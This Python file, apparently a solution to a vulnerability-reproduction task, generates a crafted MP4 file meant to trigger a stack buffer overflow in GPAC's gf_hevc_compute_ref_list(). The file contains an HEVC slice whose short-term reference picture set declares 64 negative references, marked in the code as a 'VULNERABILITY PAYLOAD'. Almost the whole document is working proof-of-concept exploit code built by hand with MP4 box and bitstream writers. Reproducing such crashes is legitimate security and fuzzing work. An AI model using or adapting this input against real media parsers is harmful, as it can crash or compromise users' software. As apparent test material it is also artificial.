import struct

class Solution:
    """
    Generates a Proof-of-Concept input for a Stack Buffer Overflow
    in gf_hevc_compute_ref_list().

    The PoC is a crafted MP4 file containing a single HEVC I-frame. The slice
    header of this frame is manipulated to specify a large number of reference
    pictures in its Short-Term Reference Picture Set (ST-RPS). When the GPAC
    parser processes this slice, the `gf_hevc_compute_ref_list` function attempts
    to populate a fixed-size stack buffer with this large number of references,
    leading to a stack-based buffer overflow.
    """

    class _BitWriter:
        """A helper class to write bitstreams."""
        def __init__(self):
            self.data = bytearray()
            self.byte = 0
            self.bit_pos = 7

        def write_bit(self, bit: int):
            if bit:
                self.byte |= (1 << self.bit_pos)
            self.bit_pos -= 1
            if self.bit_pos < 0:
                self.data.append(self.byte)
                self.byte = 0
                self.bit_pos = 7

        def write_bits(self, value: int, num_bits: int):
            for i in range(num_bits - 1, -1, -1):
                self.write_bit((value >> i) & 1)

        def write_ue(self, value: int):
            """Writes an unsigned Exp-Golomb coded integer."""
            x = value + 1
            num_bits = x.bit_length()
            leading_zeros = num_bits - 1
            self.write_bits(0, leading_zeros)
            self.write_bits(x, num_bits)

        def write_rbsp_trailing_bits(self):
            """Writes the RBSP trailing bits to align the bitstream to a byte."""
            self.write_bit(1)  # rbsp_stop_one_bit
            while self.bit_pos != 7:
                self.write_bit(0)

        def get_bytes(self) -> bytes:
            """Returns the written data as bytes, including any partial final byte."""
            final_data = self.data
            if self.bit_pos != 7:
                final_data.append(self.byte)
            return bytes(final_data)

    def _box(self, box_type: bytes, content: bytes) -> bytes:
        """Creates a standard MP4 box with a 32-bit size field."""
        size = 8 + len(content)
        return struct.pack('>I', size) + box_type + content

    def _create_slice_nalu(self) -> bytes:
        """Creates the malicious HEVC slice NAL unit."""
        bw = self._BitWriter()

        # NAL Unit Header: IDR_W_RADL (type 19), nuh_layer_id=0, nuh_temporal_id_plus1=1
        bw.write_bits(0b0010011000000001, 16)

        # Slice Segment Header
        bw.write_bit(1)  # first_slice_segment_in_pic_flag
        bw.write_bit(0)  # no_output_of_prior_pics_flag
        bw.write_ue(0)   # slice_pic_parameter_set_id
        bw.write_ue(2)   # slice_type = I_SLICE (2)
        
        # Specify RPS in slice header
        bw.write_bit(0)  # short_term_ref_pic_set_sps_flag = 0
        
        # Short-Term Reference Picture Set (ST-RPS) structure
        bw.write_bit(0)  # inter_ref_pic_set_prediction_flag
        
        # VULNERABILITY PAYLOAD: Specify a large number of negative reference pictures
        # to overflow the stack buffer in the target function.
        num_negative_pics = 64
        num_positive_pics = 0
        
        bw.write_ue(num_negative_pics)
        bw.write_ue(num_positive_pics)
        
        # Populate the ST-RPS data for each negative picture
        for i in range(num_negative_pics):
            bw.write_ue(i)      # delta_poc_s0_minus1[i]
            bw.write_bit(1)     # used_by_curr_pic_s0_flag[i]
            
        # Minimal values for the rest of the slice header
        bw.write_bit(0)         # num_ref_idx_active_override_flag
        bw.write_bit(0)         # cabac_init_flag
        
        # Finalize the NAL unit
        bw.write_rbsp_trailing_bits()

        return bw.get_bytes()
        
    def solve(self, src_path: str) -> bytes:
        slice_nalu = self._create_slice_nalu()

        vps = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\x90\x00\x00\x03\x00\x00\x03\x00\x78\x9d\xc0\x90'
        sps = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\x90\x00\x00\x03\x00\x00\x03\x00\x78\xa0\x03\xc0\x80\x10\xe5\x96\x69\x24\xca'
        pps = b'\x44\x01\xc0\x73\xc0\x49\x24'
        
        ftyp_content = b'isom\x00\x00\x02\x00isomiso2avc1mp41'
        ftyp_box = self._box(b'ftyp', ftyp_content)

        mdat_content = struct.pack('>I', len(slice_nalu)) + slice_nalu

        # Build moov box and its children from the inside out
        hvcc_nalu_arrays = (
            b'\xa0' + struct.pack('>H', 1) + struct.pack('>H', len(vps)) + vps +
            b'\xa1' + struct.pack('>H', 1) + struct.pack('>H', len(sps)) + sps +
            b'\xa2' + struct.pack('>H', 1) + struct.pack('>H', len(pps)) + pps
        )
        hvcc_header = b'\x01\x01\x60\x00\x00\x00\x90\x00\x00\x00\x00\x00\x78\xf0\x00\xfc\xfd\xf8\xf8\x00\x00\x0f'
        hvcc_content = hvcc_header + struct.pack('B', 3) + hvcc_nalu_arrays
        hvcc_box = self._box(b'hvcC', hvcc_content)
        
        hvc1_content = (
            b'\x00'*6 + struct.pack('>H', 1) + b'\x00'*16 +
            struct.pack('>HHII', 64, 64, 0x00480000, 0x00480000) +
            b'\x00'*4 + struct.pack('>H', 1) + b'\x00'*32 +
            struct.pack('>Hh', 24, -1) + hvcc_box
        )
        hvc1_box = self._box(b'hvc1', hvc1_content)
        stsd_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + hvc1_box
        stsd_box = self._box(b'stsd', stsd_content)

        stts_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + struct.pack('>II', 1, 1000)
        stts_box = self._box(b'stts', stts_content)
        stsc_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + struct.pack('>III', 1, 1, 1)
        stsc_box = self._box(b'stsc', stsc_content)
        stsz_content = b'\x00\x00\x00\x00' + struct.pack('>I', 0) + struct.pack('>I', 1) + struct.pack('>I', len(slice_nalu))
        stsz_box = self._box(b'stsz', stsz_content)

        stbl_content_without_stco = stsd_box + stts_box + stsc_box + stsz_box
        
        vmhd_content = b'\x00\x00\x00\x01' + b'\x00'*8
        vmhd_box = self._box(b'vmhd', vmhd_content)
        dref_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + self._box(b'url ', b'\x00\x00\x00\x01')
        dinf_box = self._box(b'dinf', self._box(b'dref', dref_content))
        minf_content_without_stbl = vmhd_box + dinf_box
        
        mdhd_content = b'\x00'*4 + struct.pack('>IIIIH', 0, 0, 1000, 1000, 0x55c4) + b'\x00\x00'
        mdhd_box = self._box(b'mdhd', mdhd_content)
        hdlr_content = b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00'
        hdlr_box = self._box(b'hdlr', hdlr_content)
        mdia_content_without_minf = mdhd_box + hdlr_box
        
        tkhd_content = b'\x00\x00\x00\x07' + struct.pack('>IIII', 0, 0, 1, 0) + struct.pack('>I', 1000) + b'\x00'*8 + b'\x00\x00\x00\x00' + b'\x01\x00\x00\x00' + b'\x00'*36 + struct.pack('>II', 64 << 16, 64 << 16)
        tkhd_box = self._box(b'tkhd', tkhd_content)
        
        mvhd_content = b'\x00'*4 + struct.pack('>IIII', 0, 0, 1000, 1000) + struct.pack('>iH', 0x00010000, 0x0100) + b'\x00'*10 + b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00'*24 + struct.pack('>I', 2)
        mvhd_box = self._box(b'mvhd', mvhd_content)

        # Calculate final moov size to determine mdat offset for stco
        stco_box_size = 20
        stbl_size = 8 + len(stbl_content_without_stco) + stco_box_size
        minf_size = 8 + len(minf_content_without_stbl) + stbl_size
        mdia_size = 8 + len(mdia_content_without_minf) + minf_size
        trak_size = 8 + len(tkhd_box) + mdia_size
        moov_size = 8 + len(mvhd_box) + trak_size
        
        mdat_offset = len(ftyp_box) + moov_size
        sample_offset = mdat_offset + 8
        stco_content = b'\x00\x00\x00\x00' + struct.pack('>I', 1) + struct.pack('>I', sample_offset)
        stco_box = self._box(b'stco', stco_content)
        
        # Assemble final boxes with correct sizes and offsets
        stbl_box = self._box(b'stbl', stbl_content_without_stco + stco_box)
        minf_box = self._box(b'minf', minf_content_without_stbl + stbl_box)
        mdia_box = self._box(b'mdia', mdia_content_without_minf + minf_box)
        trak_box = self._box(b'trak', tkhd_box + mdia_box)
        moov_box = self._box(b'moov', mvhd_box + trak_box)
        mdat_box = self._box(b'mdat', mdat_content)

        return ftyp_box + moov_box + mdat_box